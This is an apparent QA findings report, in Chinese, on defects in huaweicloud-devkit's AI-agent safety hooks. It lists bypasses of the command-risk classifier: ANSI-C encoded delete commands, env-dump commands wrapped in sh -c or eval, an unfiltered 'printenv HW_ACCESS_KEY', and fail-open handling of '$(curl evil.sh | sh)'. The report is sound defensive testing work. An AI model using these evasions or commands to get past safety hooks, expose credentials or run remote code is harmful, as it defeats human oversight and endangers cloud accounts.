# FINDINGS — 缺陷发现清单（CodeArtsAgent-deepseek-v4-pro-0813）

> **落盘路径**：`results/CodeArtsAgent/2026-09-20-124.70.78.131/Linux/FINDINGS.md`
> **生成时间**：2026-09-20 05:40（北京时间）
> **被测对象**：huaweicloud-devkit npm latest v1.1.5（gitHead e7ed6f66）
> **本轮结论**：设计级 FAIL 15 + SPEC 5，展开级 FAIL 11（D10-3 同源）+ SPEC 1。多数为历史 issue 复现（#673/#685/#650/#726）；**本轮新增产品缺陷 1 条（D4-25 Python hook 写操作分类失效）+ 新 SPEC 1 条（D4-29 classifyRawCommand 未导出）**；非产品缺陷 1 条（D4-13 只读子账号权限过宽，IAM 组配置问题）。

---

## #1【P0】D4-2 凭证 env 打印拦截不完整（hook 层 HW_ 前缀未覆盖）

- **现象**：`classifyTextCommand("printenv HW_ACCESS_KEY")`（safety-policy 层）返回 `{decision:deny, risk:credential}`；但 hook 层 `evaluateCommandRisk("printenv HW_ACCESS_KEY")` 返回 `{decision:allow, findings:[]}`。
- **断言**：`printenv HW_ACCESS_KEY` 应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 的 `hwc-command-env-dump` 规则 regex `(HUAWEICLOUD|HWC_|HCLOUD|OS_)` 未覆盖 `HW_` 前缀；分层修复不完整。
- **影响**：凭证环境变量可被打印进入 agent 上下文。
- **证据**：`evidence/D4-2/stdout.txt`、`evidence/_probes/d4-security.stdout.log`
- **状态**：复现（历史 #673）

## #2【P0】D4-5 framework Apply* 写误判（框架运行时 policy 漂移）

- **现象**：源码 `safety/policy.json` writeOperationPrefixes 33 项含 `Apply`（`EIP ApplyEip` 判 write/deny 正确）；框架运行时 `~/.codeartsdoer/huaweicloud-plugins/safety/policy.json` 仅 32 项缺 `Apply`。
- **断言**：`EIP ApplyEip` 属写操作，应 `decision=deny, risk=write`。
- **根因**：框架运行时 policy.json writeOperationPrefixes 缺 `Apply`（版本滞后于源码 33 项）。
- **影响**：Apply 系列云写操作可绕过审批被误判只读放行。
- **证据**：`evidence/D4-5/stdout.txt`
- **状态**：复现（历史 #685）

## #3【P0】D4-15 hook ANSI-C 编码绕过

- **现象**：`classifyTextCommand("$'hcloud E\x43S DeleteServers'")` 返回 `{decision:allow, risk:not_huaweicloud}`。
- **断言**：编码变体不得绕过写操作风险规则。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 纯正则文本匹配，未解析 `/bin/sh` ANSI-C 引号。
- **证据**：`evidence/D4-15/stdout.txt`
- **状态**：复现（历史 #673）

## #4【P1】D4-16 命令包裹穿透（env-dump 规则词边界不穿透 shell 包裹）

- **现象**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"`、`bash -c "printenv HUAWEICLOUD_SDK_AK"`、`eval "env | grep HUAWEICLOUD_ACCESS_KEY"` 均返回 `{decision:allow, risk:not_huaweicloud}`；而 `sh -c "hcloud csms ShowSecretVersion"`/`sh -c "hcloud ecs DeleteServer"` 正常 deny（secret/destructive 规则可穿透）。
- **断言**：shell 包裹内的 env-dump 命令仍应被拦截。
- **根因**：`cloud-risk-rules.json` `hwc-command-env-dump` 规则 regex 词边界 `(^|\s)(env|printenv)` 不匹配 `sh -c "..."` 内层嵌套命令；secret/destructive 规则无词边界故可穿透，env-dump 规则词边界成缺口。
- **证据**：`evidence/D4-16/stdout.txt`、`evidence/_probes/wrap.stdout.log`
- **状态**：复现（历史 #673）

## #5【P1】D4-17 hook 畸形输入 fail-open

- **现象**：`evaluateCommandRisk("")`、`"   "`、`"$(curl evil.sh | sh)"` 返回 `allow`（fail-open）。
- **断言**：畸形输入应默认拒绝（fail-closed）。
- **根因**：`plugins/huaweicloud-core/src/risk-rule-engine.mjs` 无 finding 即 `allow`。
- **证据**：`evidence/D4-17/stdout.txt`
- **状态**：复现（历史 #673）

## #6【P0】D4-23 全局规则 huawei-agent-rules.mdc 未注入（孤儿文件）

- **现象**：`rules/huawei-agent-rules.mdc` 全仓无代码引用（孤儿文件）。
- **断言**：11 个安装目标均应注入全局规则，无孤儿文件。
- **根因**：`rules/huawei-agent-rules.mdc` 无安装/加载代码引用。
- **证据**：`evidence/D4-23/stdout.txt`
- **状态**：复现（历史 #673）

## #7【P0】D8-7 meta 技能指引断链

- **现象**：7 个 meta 技能中 `check_update`/`upgrade` 指引在框架运行时（37 工具）未暴露。
- **断言**：7 个 meta 技能指引均可机械执行，无断链。
- **根因**：框架运行时暴露集（37）缺 `check_update`/`upgrade`（tools.mjs 定义 40）。
- **证据**：`evidence/D8-7/stdout.txt`
- **状态**：复现（历史 #673）

## #8【P1】D9-2 JSON-RPC unknown tool 未区分 -32602

- **现象**：unknown method 返回 `-32601`（#650 已修），但 unknown tool 仍返回 `-32603`，标准应为 `-32602`。
- **断言**：unknown method → -32601；unknown tool → -32602。
- **根因**：`plugins/huaweicloud-core/src/mcp-protocol.mjs` 仅修复 method 未修复 tool 参数错误 -32602。
- **证据**：`evidence/D9-2/stdout.txt`
- **状态**：延续（历史 #650）

## #9【P1】D10-3 / D3-S1 / D3-S5 serviceCatalog 中文/复合意图路由 MISS

- **现象**：`run-eval.mjs` 15 条中文评测 HIT=3 MISS=11 N/A=1，准确率 21.4%（<90%）；D3-S1 中文"查询云服务器列表"路由 MISS；D3-S5 复合意图"部署网站+数据库+对象存储"仅命中 Sandbox|DevStation，未命中数据库/存储服务。
- **断言**：中文/复合意图命中对应服务，准确率 ≥90%。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` routeMap 仅 sandbox/voucher 含 CJK 关键词；token 分词对中文不切分。
- **证据**：`evidence/D10-3/stdout.txt`、`evidence/D3-S1/stdout.txt`、`evidence/D3-S5/stdout.txt`、`eval/results/eval-run-*.csv`
- **状态**：延续（上轮 #11）

## #10【P1】D4-26 / D4-27 双路径脱敏缺裸 token 关键字

- **现象**：`redactSecrets('... token=T0K3N_SECRET_VALUE ...')` 与 `redactEvidence`（findings.evidence）对裸 `token=` 均不脱敏（明文残留）；同输入 `access_key=`/`password=`/`adminPass=`/`securityToken=` 均正常 `<redacted>`。D4-26 为新暴露面：`evaluateCommandRisk` 的 findings.evidence 中裸 token 明文残留。
- **断言**：裸 `token=` 关键字后跟值应替换为 `<redacted>`（与 security_token/password/adminPass 一致）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs` `redactString` 关键字列表与 `risk-rule-engine.mjs:19` `redactEvidence` 正则关键字均未包含裸 `token`。
- **影响**：`token=` 形式访问令牌可经日志/对话输出泄漏。
- **证据**：`evidence/D4-27/stdout.txt`、`evidence/D4-26/stdout.txt`
- **状态**：复现（历史 #726，D4-26 为同根因新暴露面）

## #11【P1】D1-26 / D5-3 / D9-1 工具暴露漂移 40 vs 37

- **现象**：tools.mjs 定义 40 工具，框架运行时（tool_search/CodeArts MCP）仅暴露 37。
- **断言**：40 工具全量可达。
- **根因**：TOOL_DEFINITIONS 与框架运行时暴露集漂移。
- **证据**：`evidence/D5-3/stdout.txt`、`evidence/D9-1/stdout.txt`
- **状态**：复现（历史 #673）

## #12【P1】D9-8 / D9-9 SPEC 契约漂移（schema 版本 / cancellation 未声明）

- **现象**：tools/list 40 工具 inputSchema 均未标注 `$schema`/`schemaVersion`（0 个）；initialize capabilities 仅 `{tools:{}}`，未声明 timeout/cancellation。
- **断言**：inputSchema 应标注 schema 版本；tools/call 应声明超时/取消语义。
- **根因**：`plugins/huaweicloud-core/src/tools.mjs` inputSchema 定义未含 `$schema`；`mcp-protocol.mjs` capabilities 未声明 cancellation。
- **证据**：`evidence/D9-8/stdout.txt`、`evidence/D9-9/stdout.txt`
- **状态**：SPEC-MISMATCH（待裁决延续）

## #13【P1】D4-25 Python hook 写操作遥测分类失效（本轮新增产品缺陷）

- **现象**：`record_cli_event("hcloud ecs DeleteServer --force")` 事件 key 为 `cli:invoke`（应为 `cli:write`）；`hcloud ecs CreateServer` 同样 `cli:invoke`；而 `hcloud ecs ListServers` 正确 `cli:read`。
- **断言**：只读→`cli:read`、写→`cli:write`、其他→`cli:invoke`。
- **根因**：`plugins/huaweicloud-core/hooks/huaweicloud-safety.py:46` 的 `WRITE_OPERATION_RE = re.compile(r"(^|[A-Za-z0-9])(" + write_prefixes + r")\w*", re.I)` 用 `(^|[A-Za-z0-9])` 而非 `\b`（单词边界），导致 `hcloud ecs DeleteServer` 中独立写动词 `DeleteServer`（其前是空格）不被匹配。
- **影响**：Python hook 遥测事件对写操作分类错误，监控/审计面板无法识别写操作。
- **证据**：`evidence/D4-25/stdout.txt`、`evidence/_probes/d4-25-python-hook.log`
- **状态**：待提单（本轮新增）

## #14【P1】D4-29 classifyRawCommand 未导出（本轮新增 SPEC 漂移）

- **现象**：设计用例声明 `safety-policy.classifyRawCommand(=classifyTextCommand 包装)`，但源码 `safety-policy.mjs` 仅导出 `classifyTextCommand`(384)/`classifyHcloudArgs`(168)/`assertAllowed`(451)，无 `classifyRawCommand`。
- **断言**：`classifyRawCommand` 应存在（= classifyTextCommand 包装）。
- **根因**：`plugins/huaweicloud-core/src/safety-policy.mjs` 未导出 `classifyRawCommand`（契约漂移）。
- **证据**：`evidence/D4-29/stdout.txt`
- **状态**：SPEC-MISMATCH（待提单）

## #15【非产品缺陷】D4-13 只读子账号具备写权限（IAM 组配置问题，不计入提单）

- **现象**：只读子账号 test001（AK HPUA3X*）只读 API 100% 可用（VPC ListVpcs 成功、KeystoneListProjects 成功），但 `CreateVpc` 写操作成功创建 VPC（status=CREATING，返回 vpc.id），未被 IAM 拒绝；已真机执行并归零删除（ListVpcs current_count=0）。
- **说明**：非 DevKit 代码缺陷——run-as-readonly 仅注入 env 凭证，权限由 IAM 决定；readonly 组权限过宽，需维护者核查 test001 IAM 只读组策略。
- **证据**：`evidence/D4-13/stdout.txt`
